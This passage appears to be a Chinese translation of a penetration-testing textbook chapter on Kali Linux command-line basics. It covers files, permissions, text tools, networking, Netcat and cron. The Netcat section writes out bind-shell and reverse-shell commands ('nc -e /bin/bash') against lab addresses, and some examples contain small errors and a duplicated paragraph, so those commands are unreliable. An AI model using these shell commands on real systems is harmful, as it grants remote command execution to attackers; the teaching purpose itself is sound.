  \ `IIS_USERS` 完全控制权限。\n\n## 总结\n\n我们搭建了虚拟环境，下载并自定义了用于攻击的 Kali Linux，配置了我们的虚拟网络，并配置了我们的目标操作系统——Windows\
  \ XP、Windows 7 和 Ubuntu。\n\n在下一章中，我们将习惯使用 Linux 命令行工作，并开始学习如何使用书中的许多渗透测试工具和技术。\n\
  \n## 第 2 章. 使用 Kali Linux\n\n在本书中，你将使用 Kali Linux 作为攻击平台。Kali 是流行的 BackTrack Linux\
  \ 的继任者，是一个基于 Debian 的发行版，预装并预配置了大量的渗透测试工具。任何曾在大型项目任务开始前一天尝试从零开始搭建渗透测试箱的人都知道，要让一切正常运行是一件非常痛苦的事。在\
  \ Kali 中预配置好所有内容可以节省大量时间并减少麻烦。Kali Linux 的工作方式与标准的 Debian GNU/Linux 发行版一样，但多了许多额外的工具。\n\
  \n你不会通过点击来操作 Kali，而是将使用 Linux 命令行，因为真正的力量就在这里。在本章中，我们将查看如何从命令行执行一些常见的 Linux 任务。如果你已经是\
  \ Linux 专家，可以跳过本章进入第 3 章；如果没有，请花些时间深入学习。\n\n## Linux 命令行\n\nLinux 命令行如下：\n\n```\n\
  root@kali:~#\n```\n\n就像 DOS 提示符或 Mac 终端一样，Linux 命令行让你访问一个名为 `Bash` 的命令处理器，允许你通过输入文本指令来控制系统。当你打开命令行时，你会看到提示符\
  \ `root@kali#`。*Root* 是 Linux 上的超级用户，它对 Kali 完全控制权。\n\n要在 Linux 中执行操作，你需要输入命令以及任何相关的选项。例如，要查看\
  \ root 主目录的内容，如所示输入命令 `ls`。\n\n```\nroot@kali:~# ls\nDesktop\n```\n\n如你所见，root 目录下没什么什么，只有一个名为\
  \ *Desktop*（桌面）的文件夹。\n\n## Linux 文件系统\n\n在 Linux 世界中，一切都是文件：键盘、打印机、网络设备——一切都是。所有文件都可以查看、编辑、删除、创建和移动。Linux\
  \ 文件系统由一系列从文件系统根目录 (`/`) 分出的目录组成。\n\n要查看当前目录，在终端中输入 `pwd`：\n\n```\nroot@kali:~#\
  \ pwd\n/root\n```\n\n### 更改目录\n\n要移动到另一个目录，根据你当前的位置，使用新目录的绝对或相对路径输入 `cd directory`。*绝对路径*是相对于根目录\
  \ (`/`) 的文件路径。例如，从任何地方切换到桌面，你可以输入桌面的绝对路径 `cd /root/Desktop` 即可到达 root 用户的桌面。如果你在\
  \ `/root` 目录（root 用户的主目录）中，你可以使用桌面的*相对路径*（即相对于你当前的位置）输入 `cd Desktop`，这也会带你去桌面。\n\
  \n命令 `cd ..` 会带你回到文件系统中的上一级，如所示。\n\n```\nroot@kali:~/Desktop# cd ..\nroot@kali:~/#\
  \ cd ../etc\nroot@kali:/etc#\n```\n\n从 root 的 *Desktop* 目录进入 `cd ..` 将带我们回到 root\
  \ 的主目录。从那里进入 `cd ../etc` 将带我们回到文件系统的根目录，然后进入 `/etc` 目录。\n\n## 学习命令：Man 页\n\n要了解更多关于命令及其选项和参数，可以通过输入\
  \ `man command` 查看其文档（称为其*手册页*或 *man page*）。例如，要了解更多关于 `ls` 命令，如示例 2-1 所示，输入 `man\
  \ ls`。\n\n示例 2-1. Linux man page\n\n```\nroot@kali:~# man ls\n\nLS(1)          \
  \                  User Commands                           LS(1)\n\nNAME\n     \
  \  ls - list directory contents\n\nSYNOPSIS\n       ls [OPTION]... [FILE]... ❶\n\
  \nDESCRIPTION ❷\n       List  information  about  the FILEs (the current directory\
  \ by default).\n       Sort entries alphabetically if none of -cftuvSUX nor --sort\
  \  is  speci-\nfied.\n\n       Mandatory  arguments  to  long  options are mandatory\
  \ for short options\n       too.\n\n       -a, --all ❸\n              do not ignore\
  \ entries starting with .\n\n       -A, --almost-all\n              do not list\
  \ implied . and ..\n--snip--\n       -l     use a long listing format\n--snip--\n\
  ```\n\nman 页提供了关于 `ls` 命令的有用（尽管看起来不太友好）的信息，包括它的用法 ❶、描述 ❷ 和可用选项 ❸。\n\n\n\n\n如你在 ❷\
  \ 处的描述部分所示，`ls` 命令默认列出当前工作目录下的所有文件，但你也可以使用 `ls` 获取特定文件的信息。例如，根据手册帮助页（man page），你可以使用\
  \ `ls` 配合 `-a` 选项显示所有文件，包括`hidden directories`（在默认 `ls` 列表中不显示的目录）——如示例 2-2 所示。\n\
  \n示例 2-2. 在 `ls` 上使用选项\n\n```\nroot@kali:~# ls -a\n.                         .mozilla\n\
  ..                        .msf4\n.android                  .mysql_history\n.bash_history\
  \             .nano_history\n--snip--\n```\n\n如所见，根目录下有几个隐藏目录，它们都以点号（`.`）字符开头。（在第\
  \ 8 章）中，我们将看到这些有时隐藏的目录如何导致系统破坏。）你还可以看到 `.` 和 `..` 条目，它们分别表示当前目录和父目录。\n\n## 用户权限\n\
  \nLinux 用户账户为特定个人或服务提供资源。用户可以使用密码登录，并在 Linux 系统上获得某些资源，例如写入文件和浏览互联网的能力。该用户可能无法看到属于其他用户的文件，并且可以合理地确保其他用户也看不到他的文件。除了使用密码登录并访问系统的传统用户账户外，Linux\
  \ 系统还允许软件拥有用户账户。软件可以使用系统资源执行其工作，但不能读取其他用户的私有文件。Linux 系统上公认的最佳实践是以无权限用户账户运行日常命令，而不是以特权\
  \ root 用户身份运行所有程序，以避免无意中损坏系统或授予你运行的命令和应用程序过高的权限。\n\n### 添加用户\n\n默认情况下，Kali 仅提供特权\
  \ root 账户。虽然许多安全工具需要 root 权限才能运行，但你可能想添加另一个无权限账户供日常使用，以减少对系统的潜在损害。记住，root 账户可以在\
  \ Linux 上执行任何操作，包括损坏你的所有文件。\n\n要向 Kali 系统添加新用户 `georgia`，请使用 `adduser` 命令，如示例 2-3\
  \ 所示。\n\n示例 2-3. 添加新用户\n\n```\nroot@kali:~# adduser georgia\nAdding user `georgia`\
  \ ...\nAdding new group `georgia` (1000) ...\nAdding new user `georgia` (1000) with\
  \ group `georgia` ... ❶\nCreating home directory `/home/georgia` ... ❷\nCopying\
  \ files from `/etc/skel` ...\nEnter new UNIX password: ❸\nRetype new UNIX password:\n\
  passwd: password updated successfully\nChanging the user information for georgia\n\
  Enter the new value, or press ENTER for the default\n      Full Name []: Georgia\
  \ Weidman ❹\n      Room Number []:\n      Work Phone []:\n      Home Phone []:\n\
  \      Other []:\nIs the information correct? [Y/n] Y\n```\n\n如你所示，除了向系统添加用户外，还创建了一个\
  \ `georgia` 组，向该组添加了一个新用户 ❶，为用户创建了家目录 ❷，并且系统提示输入用户信息，例如密码 ❸ 和用户的全名 ❹。\n\n### 将用户添加到\
  \ sudoers 文件\n\n当你需要以普通用户身份执行需要 root 权限的操作时，请使用 `sudo` 命令配合你想以 root 身份运行的命令，然后输入密码。为了让新创建的用户\
  \ `georgia` 能够运行特权命令，你需要将其添加到 `sudoers` 文件，该文件指定了哪些用户可以使用 `sudo` 命令。要执行此操作，如下所示输入\
  \ `adduser` `username` `sudo`。\n\n```\nroot@kali:~# adduser georgia sudo\nAdding\
  \ user 'georgia' to group `sudo' ...\nAdding user georgia to group sudo\nDone.\n\
  ```\n\n### 切换用户和使用 sudo\n\n要在终端会话中切换用户（例如从 root 用户切换到 `georgia`），请使用 `su` 命令，如示例\
  \ 2-4 所示。\n\n示例 2-4. 切换到不同的用户\n\n```\nroot@kali:~# su georgia\ngeorgia@kali:/root$\
  \ adduser john\nbash: adduser: command not found ❶\ngeorgia@kali:/root$ sudo adduser\
  \ john\n[sudo] password for georgia:\nAdding user `john` ... ❷\nAdding new group\
  \ `john` (1002) ...\nAdding new user `john` (1002) with group `john` ...\n--snip--\n\
  georgia@kali:/root$ su\nPassword:\nroot@kali:~#\n```\n\n你使用 `su` 命令切换用户。如果你尝试运行命令（如\
  \ `adduser`），你可能需要 `sudo` 来获得 root 权限。\n\n### 创建新文件或目录\n\n要创建一个新文件 `myfile`，使用 `touch`\
  \ 命令。\n\n```\nroot@kali:~# touch myfile\n```\n\n要创建一个新目录，使用 `mkdir`，如下所示。\n\n```\n\
  root@kali:~# mkdir mydirectory\nroot@kali:~# ls\n```\n\n### 复制、移动和删除文件\n\n要复制文件，使用\
  \ `cp` 命令，如下所示。\n\n```\nroot@kali:/mydirectory# cp myfile myfile2\n```\n\n语法为 `cp\
  \ source 目标`。当使用 `cp` 时，原始文件保留在原处，并在目标位置创建一个副本。\n\n同样，你可以使用 `mv` 命令将文件从一个位置移动到另一个位置。语法与\
  \ `cp` 相同，但此时文件会从源位置移除。\n\n你可以通过输入 `rm` 从文件系统中删除文件。要递归删除文件，请使用 `-r` 命令。\n\n### 警告\n\
  \n删除文件时要小心，特别是递归删除时！有些黑客开玩笑说，教 Linux 初学者的第一条命令是根目录下的 `rm -rf`，它会强制删除整个文件系统。\n\n\n\
  \n\n如果你查看 `myfile` 执行 `ls -l` 的长输出，你可以看到 `myfile` 的当前权限。\n\n```\nroot@kali:~/mydirectory#\
  \ ls -l myfile\n-rw-r--r-- 1 root root 47 Apr 23 21:15 myfile\n```\n\n从左到右，你可以看到文件类型和权限（`-rw-r--r--`）、指向文件的链接数（1）、所有文件的用户和组（root）、文件大小（47\
  \ 字节）、文件最后修改的时间（4 月 23 日 21:15），最后是文件名（`myfile`）。\n\nLinux 文件具有读取（`r`）、写入（`w`）和执行（`x`）权限，并分为组用户权限：所有者、组和所有用户的权限。前三个字母表示所有者的权限，接下来的三个表示组的权限，最后三个表示所有用户的权限。由于你是从\
  \ root 用户账户创建的 `myfile`，因此该文件由用户 `root` 和组 `root` 拥有，正如你在输出中看到的 `root root` 句所示。用户\
  \ `root` 对该文件具有读取和写入权限（`rw`）。组中的其他用户（如果有的话）可以读取文件（`r`），但不能对其进行写入或执行。最后一个 `r` 显示文件系统上的所有用户都可以读取该文件。\n\
  \n要更改文件的权限，请使用 `chmod` 命令。你可以使用 `chmod` 为所有者、组和所有人指定权限。在指定权限时，使用表 2-1 所示的 0 到 7\
  \ 的数字。\n\n表 2-1. Linux 文件权限\n\n| 整数值 | 权限 | 二进制表示 |\n| --- | --- | --- |\n| 7 |\
  \ 全部权限 | 111 |\n| 6 | 读取和写入 | 110 |\n| 5 | 读取和执行 | 101 |\n| 4 | 仅读取 | 100 |\n| 3\
  \ | 写入和执行 | 011 |\n| 2 | 仅写入 | 010 |\n| 1 | 仅执行 | 001 |\n| 0 | 无 | 000 |\n\n在输入新文件权限时，使用一个数字代表所有者，一个代表组，一个代表所有人。例如，要给所有者赋予完全权限，但让组和所有人没有读取、写入或执行文件的权限，请像这样使用\
  \ `chmod 700`：\n\n```\nroot@kali:~/mydirectory# chmod 700 myfile\nroot@kali:~/mydirectory#\
  \ ls -l myfile\n-rwx------ ❶ 1 root root 47 Apr 23 21:15 myfile\n```\n\n现在，当你对 `myfile`\
  \ 运行 `ls -l` 命令时，你可以看到 root 具有读取、写入和执行（`rwx`）权限，其他组是空的 ❶。如果你尝试以 root 以外的任何用户访问文件，将得到拒绝访问的错误。\n\
  \n## 编辑文件\n\n也许没有什么争论能比哪种是最好的文件编辑器更能激发 Linux 用户的热情。我们将查看使用两种流行编辑器 vi 和 nano 的基础，从我最喜欢的\
  \ nano 开始。\n\n```\nroot@kali:~/mydirectory# nano testfile.txt\n```\n\n一旦进入 nano，你就可以开始向名为\
  \ `testfile.txt` 的新文件中添加文本。当你打开 nano 时，你应该看到一个空白文件，屏幕底部显示 nano 的帮助信息，如下：\n\n```\n\
  \ [ New File ]\n^G Get Help  ^O WriteOut  ^R Read File ^Y Prev Page ^K Cut Text\
  \  ^C Cur Pos\n^X Exit      ^J Justify   ^W Where Is  ^V Next Page ^U UnCut Text^T\
  \ To Spell\n```\n\n要在文件中添加文本，只需开始输入即可。\n\n### 搜索文本\n\n要在文件中搜索文本，使用 ctrl-W，然后在搜索提示符中输入要搜索的文本，如下所示：\n\
  \n```\n--snip--\nSearch:georgia\n^G Get Help  ^Y First Line^T Go To Line^W Beg of\
  \ ParM-J FullJstifM-B Backwards\n^C Cancel    ^V Last Line ^R Replace   ^O End of\
  \ ParM-C Case SensM-R Regexp\n```\n\n如果文件中存在 `georgia` 这个词，Nano 应该能找到。要退出，按 ctrl-X。系统将提示你保存文件还是丢失更改，如下所示：\n\
  \n```\n--snip--\nSave modified buffer (ANSWERING \"No\" WILL DESTROY CHANGES) ?\
  \ Y\n Y Yes\n N No           ^C Cancel\n```\n\n输入 `Y` 保存文件。现在我们用用 vi 编辑器编辑文件。\n\n\
  ### 使用 vi 编辑文件\n\n将示例 2-5 中的文本添加到 `testfile.txt` 中。除了文件内容外，在 vi 屏幕底部可以看到一些信息，包括文件名、行数和当前光标位置（参见示例\
  \ 2-5）。\n\n示例 2-5. 使用 vi 编辑文件\n\n```\nroot@kali:~/mydirectory# vi testfile.txt\n\
  hi\ngeorgia\nwe\nare\nteaching\npentesting\ntoday\n~\n\n\"testfile.txt\" 7L, 46C\
  \                                        1,1           All\n```\n\n与 nano 不同，一旦在\
  \ vi 中打开文件，你不能直接开始编辑。要编辑文件，按 `I` 将 vi 插入模式。你应该能看到终端底部显示 `INSERT` 字样。一旦完成更改，按 esc\
  \ 退出插入模式返回命令模式。在命令模式下，你可以使用命令来编辑文本。例如，将光标置于行 `we` 上并输入 `dd` 从文件中删除单词 `we`。\n\n要退出\
  \ vi，输入 `:wq` 告诉 vi 将更改写入文件并退出，如示例 2-6 所示。\n\n示例 2-6. 在 vi 中保存更改\n\n```\nhi\ngeorgia\n\
  are\nteaching\npentesting\ntoday\n\n:wq\n```\n\n### 注意\n\n要了解更多关于 vi 的可用命令，请阅读相应的\
  \ man 页面。\n\n每天使用什么编辑器取决于你。在本书中我们将使用 nano 编辑文件，但你可以随时替换你喜欢的编辑器。\n\n## 数据处理\n\n现在来处理一点数据处理。对于示例\
  \ 2-7 中的文本，使用你喜欢的编辑器处理 `myfile`。文件列出了我喜欢的一些安全会议以及它们举行的时间。\n\n示例 2-7. 数据处理\n\n```\n\
  root@kali:mydirectory# cat myfile\n1 Derbycon September\n2 Shmoocon January\n3 Brucon\
  \ September\n4 Blackhat July\n5 Bsides *\n6 Hackeralted October\n7 Hackcon April\n\
  ```\n\n### 使用 grep\n\n`grep` 命令在文件中查找字符串。例如，要在文件中搜索 `September` 的所有实例，输入 `grep myfile`：\n\
  \n```\nroot@kali:mydirectory# grep myfile\n1 Derbycon September\n3 Brucon September\n\
  ```\n\n如你所示，`grep` 告诉我们 Derbycon 和 Brucon 在九月。\n\n现在假设你只需要九月份会议的名称，而不需要数字或月份。你可以使用管道\
  \ `|` 将 `grep` 的输出发送到另一个命令进行进一步处理。`cut` 命令允许对每行输入选择分隔符并打印特定字段。例如，为了获取九月份举办的会议名称，你可以像之前那样\
  \ `grep`。接下来，将输出管道（|`）到 `cut`，其中你使用 `-d` 选项指定空格作为分隔符，并使用 `-f` 选项指定第二个字段，如下所示：\n\n\
  ```\nroot@kali:mydirectory# grep September myfile | cut -d \" \" -f 2\nDerbycon\n\
  Brucon\n```\n\n如你所见，通过将两个命令连接起来，你得到了 Derbycon 和 Brucon 会议。\n\n### 使用 sed\n\n另一个处理数据的命令是\
  \ `sed`。关于使用 `sed` 可以写一整本书书，但我们在这里只涵盖基础知识，通过一个查找并替换特定单词的简单示例。\n\n`sed` 命令非常适合根据某些模式或表达式自动编辑文件。例如，假设你有一个非常长的文件，需要替换某个单词的所有实例。你可以使用\
  \ `sed` 命令快速且自动地完成操作。\n\n\n\n\n在 `sed` 语言中，斜杠（`/`）是分隔符。例如，要将 `myfile` 中所有的单词 `Blackhat`\
  \ 替换为 `Defcon`，请输入 `sed 's/Blackhat/Defcon/' myfile`，如示例 2-8 所示。\n\n示例 2-8. 使用 `sed`\
  \ 替换单词\n\n```\nroot@kali:~/mydirectory# sed 's/Blackhat/Defcon/' myfile\n1 Derby\
  \ September\n2 Shmoocon January\n3 Brucon September\n4 Defcon July\n5 Bsides *\n\
  6 HackerHalted October\n7 Hackcon April\n```\n\n### 使用 awk 进行模式匹配\n\n另一个用于模式匹配的命令行工具是\
  \ `awk` 命令。例如，如果你想找到编号为 6 或更大的会议，可以使用 `awk` 搜索第一字段中大于 5 的条目，如下所示。\n\n```\nroot@kali:~/mydirectory#\
  \ awk '$1 >5' myfile\n6 HackerHalted October\n7 Hackcon April\n```\n\n或者，如果你只需要每行的第一个和第三个单词，可以输入\
  \ `awk '{print $1,$3;}' myfile`，如示例 2-9 所示。\n\n示例 2-9. 使用 `awk` 选择某些列\n\n```\nroot@kali:~/mydirectory#\
  \ awk '{print $1,$3;}' myfile\n1 September\n2 January\n3 September\n4 July\n5 *\n\
  6 October\n7 April\n```\n\n### 注意事项\n\n在本节中，我们只查看了使用这些数据处理工具的简单示例。如需获取更多信息，请参阅 `man`\
  \ 页面。这些工具可以极大节省时间。\n\n## 管理已安装的软件包\n\n在 Kali Linux 等基于 Debian 的 Linux 发行版中，你可以使用高级软件包工具\
  \ (`apt`) 来管理软件包。要安装软件包，输入 `apt-get install` `package`。例如，在 Kali Linux 中安装 Raphael\
  \ Mudge 为 Metasploit 开发的前端 Armitage，请输入以下命令：\n\n```\nroot@kali:~# apt-get install\
  \ armitage\n```\n\n就这么简单：`apt` 会为你安装并配置 Armitage。\n\nKali Linux 上安装的工具会定期发布更新。要获取已安装软件包的最新版本，请输入\
  \ `apt-get upgrade`。Kali 使用的软件包仓库列在 `/etc/apt/sources.list` 文件中。要添加额外的存储库，你可以编辑此文件，然后运行\
  \ `apt-get update` 命令刷新数据库以包含新的存储库。\n\n### 注意事项\n\n除非第 1 章 中另有说明，否则本书基于 Kali 1.0.6\
  \ 的基础安装版本构建，因此为了按照书籍操作，请不要更新 Kali。\n\n## 进程与服务\n\n在 Kali Linux 中，你可以使用 `service`\
  \ 命令启动、停止或重启服务。例如，要启动 Apache Web 服务器，输入 `service apache2 start`，如下所示。\n\n```\nroot@kali:~/mydirectory#\
  \ service apache2 start\n[....] Starting web server: apache2: Could not reliably\
  \ determine the server's fully qualified domain name, using 127.0.1.1 for ServerName\n\
  . ok\n```\n\n同样，要停止 MySQL 数据库服务器，输入 `service mysql stop`。\n\n## 管理网络\n\n在第 1 章中设置\
  \ Kali Linux 虚拟机时，你使用了 `ifconfig` 命令查看网络信息，如示例 2-10 所示。\n\n示例 2-10. 使用 `ifconfig`\
  \ 查看网络信息\n\n```\nroot@kali:~# ifconfig\neth0❶     Link encap:Ethernet  HWaddr 00:0c:29:df:7e:4d\n\
  \          inet addr:192.168.20.9❷  Bcast:192.168.20.255  Mask:255.255.255.0\n \
  \         inet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link\n          UP BROADCAST\
  \ RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:1756332 errors:930193\
  \ dropped:17 overruns:0 frame:0\n          TX packets:1115419 errors:0 dropped:0\
  \ overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:1048617759\
  \ (1000.0 MiB)  TX bytes:115091335 (109.7 MiB)\n          Interrupt:19 Base address:0x2024\n\
  --snip--\n```\n\n从 `ifconfig` 的输出中，你可以获取大量关于系统网络状态的信息。例如，网络接口被称为 `eth0` ❶。Kali 机器用于连接网络的\
  \ IPv4 地址 (`inet addr`) 是 `192.168.20.9` ❷（你的可能不同）。`IP 地址` 是分配给网络中设备的 32 位标签。地址的**掩码或子网掩码\
  \ (`netmask`) ❸ 标识了 IP 地址的哪些部分属于网络，哪些部分属于主机。在这种情况下，掩码 `255.255.255.0` 告诉你网络是前三个字节\
  \ `192.168.20`。**默认网关**是主机路由到其他网络的地方。所有发往本地网络外的流量都将发送到默认网关以确定去向。\n\n```\nroot@kali:~#\
  \ route\nKernel IP routing table\nDestination     Gateway         Genmask      \
  \   Flags Metric    Use If\ndefault         192.168.20.1     0.0.0.0         UG\
  \        100    0 eth0\n192.168.20.0    0.0.0.0         ...（此处省略原文对应内容）\n```\n\n\
  从 `ifconfig` 的输出中，你可以获取大量关于系统网络状态的信息。例如，网络接口名为 `eth0` ❶。Kali 机器用于连接网络的 IPv4 地址 (`inet\
  \ addr`) 是 `192.168.20.9` ❷（你的可能不同）。`IP 地址` 是分配给网络中设备的 32 位标签。地址的**掩码或子网掩码 (`Mask`)\
  \ ❸** 标识了 IP 地址的哪些部分属于网络，哪些部分属于主机。在这种情况下，掩码 `255.255.255.0` 告诉你网络是前三个字节 `192.168.20`。**默认网关**是主机路由到其他网络的地方。所有发往本地网络外的流量都将发送到默认网关以确定去向。\n\
  \n```\nroot@kali:~# route\nKernel IP routing table\nDestination     Gateway    \
  \     Genmask         Flags Metric    Use If\ndefault         192.168.20.1     0.0.0.0\
  \         UG        100    0 eth0\n192.168.20.0    0.0.0.0         255.255.255.0\
  \   UG        0      0 eth0\n```\n\n`route` 输出告诉我们默认网关是 `192.168.20.1`。\n\n### 设置静态\
  \ IP\n\n默认情况下，你的网络连接使用动态主机配置 (DHCP) 从网络获取 IP 地址。要设置静态地址以防止 IP 地址发生变化，你需要编辑 `/etc/interfaces`\
  \ 文件。默认配置可见示例 2-11。\n\n示例 2-11. `/etc/interfaces`\n\n```\n# 此文件描述系统上可用的网络接口\n# 以及如何激活它们。更多信息，请参阅\
  \ interfaces(5)。\n\n### 回环网络接口\nauto lo\niface lo inet loopback\n```\n\n要给你的系统分配静态\
  \ IP，你需要为 `eth0` 接口添加条目。将示例 2-12 所示的文本添加到 `/etc/interfaces`，并修改 IP 地址以你的环境。\n\n\
  示例 2-12. 设置静态 IP\n\n```\n# 此文件描述系统上可用的网络接口\n# 以及如何激活它们。更多信息，请参阅 interfaces(5)。\n\
  \n### 回环网络接口\nauto lo\niface lo inet loopback\nauto eth0\niface eth0 inet static\
  \ ❶\naddress 192.168.20.9\nnetmask 255.255.255.0 ❷\ngateway 192.168.20.1 ❸\n```\n\
  \n你将 `eth0` 的 IP 地址设置为静态 ❶。使用你在上一节找到的 IP 地址、子网掩码 ❷ 和网关 ❸ 来填充文件中的信息。\n\n完成这些更改后，运行\
  \ `service networking restart` 重启网络，以便使用新添加的静态网络信息。\n\n### 查看网络连接\n\n查看网络连接、监听端口等，请使用\
  \ `netstat` 命令。例如，你可以通过执行 `netstat -antp` 命令查看在 TCP 端口上监听的程序，如示例 2-13 所示。**端口**仅仅是基于软件的网络套字，在网络上监听以允许远程系统与系统上的程序进行交互。\n\
  \n\n\n\n\n```\nroot@kali:~/mydirectory# netstat -antp\nActive Internet connections\
  \ (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign\
  \ Address         State       PID/Program name\ntcp6       0      0 :::80      \
  \             :::*                    LISTEN      15090/apache2\n```\n\n你可以看到，你在在本章节开始部分启动的\
  \ Apache Web 服务器正在监听 TCP 端口 80。（请参阅 man 页以获取其他 `netstat` 选项。）\n\n## Netcat：TCP/IP\
  \ 连接的“瑞士军刀”\n\n如 man 页所示，`Netcat` 工具被称为 TCP/IP 连接的“瑞士军刀”。它是一个多功能工具，我们将在整整本书中利用它。\n\
  \n要查看 `Netcat` 的各种选项，请输入 `nc -h`，如示例 2-14 所示。\n\n示例 2-14. Netcat 帮助信息\n\n```\nroot@kali:~#\
  \ nc -h\n[v1.10-40]\nconnect to somewhere:   nc [-options] hostname port[s] [ports]\
  \ ...\nlisten for inbound:     nc -l -p port [-options] [hostname] [port]\noptions:\n\
  \      -c shell commands  as `-e'; use /bin/sh to exec [dangerous!!]\n      -e filename\
  \       program to exec after connect [dangerous!!]\n      -b                allow\
  \ broadcasts\n--snip--\n```\n\n### 检查端口是否正在监听\n\n让我们让 `Netcat` 连接到一个端口，以查看该端口是否正在监听连接。你之前已经看到\
  \ Apache Web 服务器在 Kali Linux 系统上监听 80 端口。告诉 `Netcat` 使用 `-v` 选项以详细模式附加到 80 端口，或者输出详细信息，如下所示。如果你正确启动了\
  \ Apache，在尝试连接该服务时，你应该看到以下内容。\n\n```\nroot@kali:~# nc -v 192.168.20.9 80\n(UNKNOWN)\
  \ [192.168.20.10] 80 (http) open\n```\n\n如你所见，`Netcat` 报告 80 端口确实在网络上监听（`open`）（我们将在第\
  \ 5 章关于端口扫描的讨论中更多开放端口以及为什么它们很有趣。）\n\n你也可以使用 `Netcat` 监听端口的传入连接，如下所示。\n\n```\nroot@kali:~#\
  \ nc -lvp 1234\nlistening on [any] 1234 ...\n```\n\n你使用的选项 `l` 表示监听（listen），`v`\
  \ 表示详细（verbose），`p` 指定要监听的端口。\n\n接下来，打开第二个终端窗口并使用 `Netcat` 连接到 `Netcat` 监听器。\n\n\
  ```\nroot@kali:~# nc 192.168.20.9 1234\nhi georgia\n```\n\n一旦连接成功，输入文本 `hi georgia`，当你回到监听器的终端窗口时，你会发现接收到了连接，并且你的文本已打印出来。\n\
  \n```\nlistening on [any] 1234 ...\nconnect to [192.168.20.9] from (UNKNOWN) [192.168.20.9]\
  \ 51917\nhi georgia\n```\n\n按下 CTRL-C 关闭两个 `Netcat` 进程。\n\n### 开启命令 Shell 监听器\n\n\
  现在来点更有趣的。当你设置 `Netcat` 监听器时，使用 `-e` 标志告诉 `Netcat` 在接收到连接时执行 `/bin/bash`（或启动 Bash\
  \ 命令提示符）。这允许任何连接到监听器的人在你的系统上执行命令，如下所示。\n\n```\nroot@kali:~# nc -lvp 1234 -e /bin/bash\n\
  listening on [any] 1234 ...\n```\n\n再次使用第二个终端窗口连接到 `Netcat` 监听器。\n\n```\nroot@kali:~#\
  \ nc 192.168.20.9 1234\nwhoami\nroot\n```\n\n你现在可以发布 Linux 命令并由 `Netcat` 监听器执行它们。`whoami`\
  \ Linux 命令将告诉你当前登录的用户。在这种情况下，由于 `Netcat` 进程是由 `root` 用户启动的，因此你的命令将以 `root` 身份执行。\n\
  \n### 注意\n\n这是一个简单的示例，因为你的 `Netcat` 监听器和连接都在同一个系统上。你也可以使用另一个虚拟机甚至你的主机系统进行此练习。\n\n\
  再次关闭两个 `Netcat` 进程。\n\n### 将命令 Shell 推回监听器\n\n除了在端口监听命令 Shell 外，你还可以将命令 Shell 推回\
  \ `Netcat` 监听器。这次如下所示，在不带 `-e` 标志设置 `Netcat` 监听器。\n\n```\nroot@kali:~# nc -lvp 1234\n\
  listening on [any] 1234 ...\n```\n\n现在打开第二个终端，并如下连接回你刚刚创建的 `Netcat` 监听器。\n\n```\n\
  root@kali:~# nc 192.168.20.9 1234 -e /bin/bash\n```\n\n照常一样使用 `Netcat` 连接，但这次使用\
  \ `-e` 标志在连接上执行 `/bin/bash`。回到你的第一个终端，你将看到如下所示的连接，如果你输入终端命令，将看到它们被执行。（我们将在第 4 章\
  \ 中学习更多关于在本地端口使用 `/bin/bash` 监听以及通过连接主动推送 `/bin/bash`，这分别被称为*绑定 Shell（bind shells）*和*反向\
  \ Shell（reverse shells）*。）\n\n```\nlistening on [any] 1234 ...\nconnect to [192.168.20.9]\
  \ from (UNKNOWN) [192.168.20.9] 51921\nwhoami\nroot\n```\n\n现在，关于 `Netcat` 还有一点。这次，不要将进入监听器的内容输出到屏幕，而是使用\
  \ `>` 将其发送到文件，如下所示。\n\n```\nroot@kali:~# nc -lvp 1234 > netcatfile\nlistening on\
  \ [any] 1234 ...\n```\n\n在第二个终端中设置 `Netcat` 连接，但这次你使用 `>` 符号发送文件。\n\n## 使用 cron\
  \ 任务实现任务\n\n`cron` 命令允许我们调度任务在指定时间自动运行。在 Kali 的 `/etc` 目录下，你可以看到几个与 `cron` 相关的文件和目录，如示例\
  \ 2-15 所示。\n\n示例 2-15. crontab 文件\n\n```\nroot@kali:/etc# ls | grep cron\ncron.d\n\
  cron.daily\ncron.hourly\ncron.monthly\ncrontab\ncron.weekly\n```\n\n`cron.daily`、`cron.hourly`、`cron.monthly`\
  \ 和 `cron.weekly` 目录指定了根据你将脚本放在哪个目录，每天、每小时、每月或每周自动运行的脚本。如果你需要更大的灵活性，可以编辑 `cron`\
  \ 的配置文件 `/etc/crontab`。默认文本如示例 2-16 所示。\n\n示例 2-16. crontab 配置文件\n\n```\n### /etc/crontab:\
  \ 系统级 crontab\n# 与其他 crontab 不同，当你编辑此文件和\n# /etc/cron.d 中的文件时，不需要运行 crontab\n# 命令来安装新版本。这些文件还有用户名字段，\n\
  # 这是其他 crontab 都不具备的。\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\
  \n### m h dom mon dow user     command\n17 *  * * * root    cd / && run-parts --report\
  \ /etc/cron.hourly ❶\n25 6  * * * root  test -x /usr/sbin/anacron || ( cd / && run-parts\
  \ --report /etc/cron.daily ) ❷\n47 6  * * 7 root  test -x /usr/sbin/anacron || (\
  \ cd / && run-parts --report /etc/cron.weekly )\n52 6  1 * * root  test -x /usr/sbin/anacron\
  \ || ( cd / && run-parts --report /etc/cron.monthly )\n#\n```\n\n`crontab` 中的字段从左到右分别是：分钟、小时、日期、月份、星期、执行命令的用户，最后是要执行的命令。要在每周的每天、每小时等情况下运行命令，请在该列中使用星号\
  \ `*` 而不是指定值。\n\n\n\n\n\n例如，查看 ❶ 处的第一行 `crontab`，它会运行 `/etc/cron.hourly` 中指定的每小时\
  \ `cron` 任务。该 `crontab` 在每月、每周、每天的每小时第 17 分钟运行。❷ 处的行表示每日 `crontab`（`/etc/cron.daily/`）将在每月的、每周的、每天的第\
  \ 6 小时的第 25 分钟运行。（为了更具灵活性，你可以在这里添加一行，而不是添加到每小时、每日、每周或每月的列表中。）\n\n## 总结\n\n在本章中，我们查看了一些常见的\
  \ Linux 任务。在 Linux 文件系统中导航、处理数据以及运行服务都是在阅读本书后续内容时对你有裨益的技能。此外，在攻击 Linux 系统时，知道在 Linux\
  \ 环境中运行哪些命令将帮助你充分利用成功漏洞利用的成果。你可能希望通过设置 `cron` 任务来定期运行某个命令，或者使用 `Netcat` 从你的攻击机传输文件。在本书中，你将使用\
